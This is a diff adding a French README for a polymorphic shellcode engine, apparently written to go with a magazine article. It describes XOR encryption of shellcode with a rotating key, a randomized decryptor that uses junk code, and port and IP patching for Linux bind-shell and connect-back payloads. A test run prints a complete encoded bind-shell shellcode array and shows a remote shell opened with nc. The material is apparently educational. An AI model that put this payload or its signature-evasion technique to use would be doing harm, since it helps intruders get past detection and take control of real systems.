@@ -1,0 +1,246 @@
+
+
+
+
+1 - PSE : Fonctionnement
+------------------------
+
+PSE genere un code asm permetant de decrypter le shellcode
+voulu, precedament crypte avec une cle aleatoire.
+
+Le decrypteur est genere de facon 'aleatoire' : 
+  - Invertion de l'ordre certainne mnemoniques.
+  - Utilisation de mnemoniques differente pour 'faire la meme chose'.
+  - Injection de junk code de facon aleatoire.
+
+Le cryptage du shellcode ce fait grace a un xor avec une cle de 8 bits.
+La valeur de la cle est incrementer pour chaque octet.
+La cle est comprise entre 1(inclus) et 255(inclus). La cle est
+choisi de facon a ce que le shellcode resultat ne comporte aucun 00.
+Le shellcode de base peut contenir des 00, le cryptage les transformera.
+
+PSE permet aussi de patcher les shellcodes pour modifier leur
+port(pour les bindshell) ou leur port/ip (pour les connectback).
+Tout cela biensur sans que cela genere de 00 dans le shellcode final. 
+
+Le junk code est insere en prenant de facon aleatoire des instructions
+dans 2 tableau.
+Le tableau JUNK1 contient des instructions code sur 1 octets et JUNK2 
+des instructions code sur 2 octets
+
+
+
+
+2 - A quoi ressemble le resultat final
+--------------------------------------
+
+
+Calcul du delta offset:
+-----------------------
+
+  JMP   SHORT @1
+@2:
+  POP   EBP
+  JUNK1
+@1:
+  CALL  @2
+  JUNK1
+  JUNK2
+
+
+Cette parti est la moins 'changeante' des 3. Les changement
+ce font uniquement grace au junk code.
+
+
+
+Initialisation de la boucle de decryptage:
+------------------------------------------
+
+  ADD EBP, xx
+  MOV ESI, EBP
+  MOV EDI, EBP
+  XOR ECX, ECX
+  MOV  CL, key
+  MOV reg, size
+
+l'ordre de ces instructions est genere de facon aleatoire,
+la seule condition est de metre le ADD EBP, xx avant le
+init de esi ou edi.
+Key est une cle aleatoire genere de facon aleatoire mais
+de facon a ne pas genere de 00.
+Reg peut etre soit ebx soit edx. Size est la size du shellcode.
+Ensuite un junkcode est insere n'importe ou de facon aleatoire
+entre ces 5 lignes.
+
+
+
+
+Boucle de decryptage:
+---------------------
+
+  CLD
+     LODSB
+     JUNK2
+  ou
+     MOV AL, [ESI]
+     INC ESI
+  XOR AL, reg
+     MOV [EDI], AL
+     INC EDI
+  ou
+     STOSB
+     JUNK2
+
+
+
+Shellcode :
+-----------
+
+Shellcode patchee et cryptee precedament. 
+
+
+
+
+Au final la boucle de decryptage fait 51 octets.
+
+
+
+
+
+3 - Test
+--------
+
+emp@neptune:~/code/c/pse $ ./pse -h
+
+     @@@
+    @. .@
+    @\=/@
+    .- -.
+   /(. .)\
+   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+   '( v )`     version 0.01b
+     \|/
+     (|)
+     '-`
+
+./pse [shellcode number] [port] [ip]
+
+shellcode list : 
+0 - linux : Bind shell.
+1 - linux : Connect back.
+2 - pas dispo
+3 - pas dispo
+
+
+emp@neptune:~/code/c/pse $ ./pse 0 1234
+
+     @@@
+    @. .@
+    @\=/@
+    .- -.
+   /(. .)\
+   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+   '( v )`     version 0.01b
+     \|/
+     (|)
+     '-`
+
+[-] Recherche d'une cle pour -> linux : Bind shell.
+key = 118
+
+[-] Generation : calcul delta offset :
+JMP SHORT XX
+POP EBP
+CLC
+JMP SHORT XX
+PUSH EBX
+POP EBX
+CALL XXXXXXXX
+INC EAX
+DEC ECX
+INC ECX
+
+[-] Generation : initialisation de la boucle :
+XOR reg, reg
+MOV reg8, 'key'
+ADD EBP, xx
+CMC
+MOV ESI, EBP
+DEC EBX
+INC EBX
+PUSH ECX
+POP ECX
+XOR ECX, ECX
+MOV CL, 'size'
+MOV EDI, EBP
+XCHG ECX, ECX
+size = 92, reg = EBX, key = 118
+
+[-] Generation : boucle :
+CLD
+LODSB
+XCHG EBX, EBX
+XOR AL, BL
+INC BL
+MOV [EDI], AL
+INC EDI
+LOOP
+
+Sortie binaire dans : shellcode.bin
+Sortie texte dans : shellcode.c
+
+emp@neptune:~/code/c/pse $ cat shellcode.c 
+
+char shellcode[]=
+"\xeb\x06\x5d\xf8\xeb\x07\x53\x5b\xe8\xf5\xff\xff\xff\x49\x41"
+"\x40\x31\xdb\xb3\x76\x83\xc5\x26\x26\x89\xee\x4b\x43\x51\x59"
+"\x31\xc9\xb1\x5c\x89\xef\x87\xc9\xfc\xac\x87\xdb\x30\xd8\xfe"
+"\xc3\x88\x07\x47\xe2\xf4"
+"\x47\xb7\xe1\xc9\x1c\x29\x3e\x2f\x3c\x2d\x09\x60\xe8\x82\xdf"
+"\x48\x06\x0e\x4f\x10\xd8\xed\xe4\x89\x5c\xcc\xf6\xc2\x1b\x72"
+"\xfe\x85\xc7\xc7\x11\x78\x2a\xfd\x51\x1d\x2e\xf9\x13\xa5\x6f"
+"\x23\xf4\xf2\x2f\x46\xeb\x19\xcc\x66\x2c\x9c\x67\x1e\xb3\x22"
+"\xfb\x03\x8b\x78\x36\x32\x71\xcc\x4d\x8a\x7c\x0d\xb5\xee\xa8"
+"\xee\xed\xb0\xac\xad\xe9\xa5\xa1\xa7\x43\x28\x9d\x9e\x47\x2e"
+"\x1d\x51";
+
+emp@neptune:~/code/c/pse $ cd test/
+emp@neptune:~/code/c/pse/test $ ./test.sh 
+
+Hello dude, welcome to my (so er0tic) test script for PSE
+
+The shellcode is in data segment.
+If you have non-executable user pages protection disable it for the test.
+
+Compiling :
+
+Ok, running the shellcode ->
+
+
+
+
+
+
+Dans un autre shell :
+
+emp@neptune:~ $ nc localhost 1234
+uname -a 
+Linux neptune 2.6.10-5-386 #1 Tue Apr 5 12:12:40 UTC 2005 i686 GNU/Linux
+ls  
+shellcode
+shellcode.c
+test.sh
+
+
+
+4 - NOTE
+--------
+
+Ce code a etais realisee vite fait durant le peu de temps libre que j'ai,
+soyez indulgents quand a ca qualite.
+Je ne retoucherais certainement pas ce code, sont seul but est d'illustrer 
+un article sur les shellcodes polymorphe pour le magazine n0name.
+
+
+Si vous voulez discuter du code ou autre : irc.freenode.org   /query emp_
+
